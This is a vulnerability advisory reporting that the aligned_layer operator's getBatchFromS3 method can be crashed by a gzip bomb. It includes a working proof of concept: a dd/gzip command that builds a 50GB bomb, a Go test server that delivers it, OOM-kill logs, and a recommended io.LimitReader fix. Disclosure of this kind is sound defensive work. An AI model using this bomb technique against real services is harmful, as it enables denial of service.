# Operator is vulnerable to OOM due to getBatchFromS3

**Author(s):** Mohammed Benhelli [@Fuzzinglabs](https://github.com/FuzzingLabs/)

**Date:** 01/08/2024

### **Executive summary**

During the process of auditing the code and developing fuzzing harnesses, we found that the `getBatchFromS3` method of 
`Operator` is vulnerable to an OOM attack via a crafted gzip file for example.

### Vulnerability Details

- **Severity:** High
- **Affected Component:** `operator/pkg/s3.go`

## Environment

- **Distro Version:** Ubuntu 22.04.4 LTS
- **Additional Environment Details:** go version go1.22.5 linux/amd64

## Steps to Reproduce

To demonstrate the issue, we provide a Proof of Concept (POC) to show that the bug can be triggered in the `operator`
package.

1. Create a gzip file in your test folder, here `aligned_layer/fuzzinglabs/operator`:
   ```sh
    dd if=/dev/zero bs=1M count=50240 | gzip > 50G.gzip
   ```
2. Create a file in your test folder with the following content:
   ```go
   package operator_test
   
   import (
      "github.com/Layr-Labs/eigensdk-go/logging"
      "github.com/ethereum/go-ethereum/common"
      servicemanager "github.com/yetanotherco/aligned_layer/contracts/bindings/AlignedLayerServiceManager"
      "github.com/yetanotherco/aligned_layer/core/config"
      operator "github.com/yetanotherco/aligned_layer/operator/pkg"
      "net/http"
      "os"
      "runtime"
      "testing"
   )
   
   // 1GB
   const LimitRamUsage = 1024 * 1024 * 1024
   
   // 256MB
   const LimitBatchSize = 256 * 1024 * 1024
   
   func TestGetBatchS3OOM(t *testing.T) {
      go startTestServerOOM(t)
      defer runtime.GOMAXPROCS(runtime.GOMAXPROCS(1))
      var start, end runtime.MemStats
      runtime.GC()
      runtime.ReadMemStats(&start)
      processGzipBomb(t)
      runtime.ReadMemStats(&end)
      alloc := end.TotalAlloc - start.TotalAlloc
      if alloc > LimitRamUsage {
         t.Fatalf("Memory usage exceeded limit: %d", alloc)
      }
   }
   
   func processGzipBomb(t *testing.T) {
      logger, err := config.NewLogger(logging.Production)
      if err != nil {
         t.Fatalf("Error creating logger: %v", err)
      }
      op := operator.Operator{
         Logger: logger,
         Config: config.OperatorConfig{
            Operator: struct {
               AggregatorServerIpPortAddress string
               Address                       common.Address
               EarningsReceiverAddress       common.Address
               DelegationApproverAddress     common.Address
               StakerOptOutWindowBlocks      int
               MetadataUrl                   string
               RegisterOperatorOnStartup     bool
               EnableMetrics                 bool
               MetricsIpPortAddress          string
               MaxBatchSize                  int64
            }{MaxBatchSize: LimitBatchSize},
         },
      }
      newBatchLog := &servicemanager.ContractAlignedLayerServiceManagerNewBatch{
         BatchMerkleRoot:  [32]byte([]byte("[\t\t\t\t\t\t\t\t\t\t\t\t\\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t]")),
         BatchDataPointer: "http://localhost:8080",
      }
      if err := op.ProcessNewBatchLog(newBatchLog); err != nil {
         t.Logf("Error processing new batch log: %v", err)
      }
   }
   
   func startTestServerOOM(t *testing.T) {
      http.HandleFunc("/", handleRequestOOM)
      t.Fatal(http.ListenAndServe(":8080", nil))
   }
   
   func handleRequestOOM(w http.ResponseWriter, r *http.Request) {
      switch r.Method {
      case http.MethodHead:
      case http.MethodGet:
         content, err := os.ReadFile("50G.gzip")
         if err != nil {
            http.Error(w, "File not found", http.StatusNotFound)
            return
         }
         w.Header().Set("Content-Encoding", "gzip")
         if _, err := w.Write(content); err != nil {
            return
         }
      default:
         http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
      }
   }
   ```
3. Run the test:
   ```sh
   go test github.com/yetanotherco/aligned_layer/fuzzinglabs/operator
   ```
4. Read the exit status of the test.
   ```shell
   dmesg
   ```

## Root Cause Analysis

The root cause is located in `operator/pkg/s3.go`.

```go
package operator
...
func (o *Operator) getBatchFromS3(batchURL string, expectedMerkleRoot [32]byte) ([]VerificationData, error) {
   ...
   batchBytes, err := io.ReadAll(resp.Body)
   ...
}
```

`io.ReadAll` reads from the `resp.Body` until an EOF is encountered. If the `resp.Body` is a gzip file, it will be
decompressed in memory, which can lead to an OOM attack.

## Detailed Behavior

### Test output

```sh
=== RUN   TestGetBatchS3OOM
{"level":"info","ts":1722602535.7498837,"caller":"pkg/operator.go:177","msg":"Received new batch with proofs to verify","batch merkle root":[91,9,9,9,9,9,9,9,9,9,9,9,9,92,116,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9]}
{"level":"info","ts":1722602535.7516584,"caller":"pkg/s3.go:13","msg":"Getting batch from S3..., batchURL: http://localhost:8080"}


Process finished with the exit code 1
```

### Dmesg output

```sh
...
[37076.492062] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),cpuset=/,mems_allowed=0,global_oom,task_memcg=/,task=___9TestGetBatc,pid=1999192,uid=1000
[37076.492126] Out of memory: Killed process 1999192 (___9TestGetBatc) total-vm:23834908kB, anon-rss:14799024kB, file-rss:0kB, shmem-rss:0kB, UID:1000 pgtables:36904kB oom_score_adj:0
```

## Recommendations

- Using `io.LimitReader` to limit the amount of data read from the response body.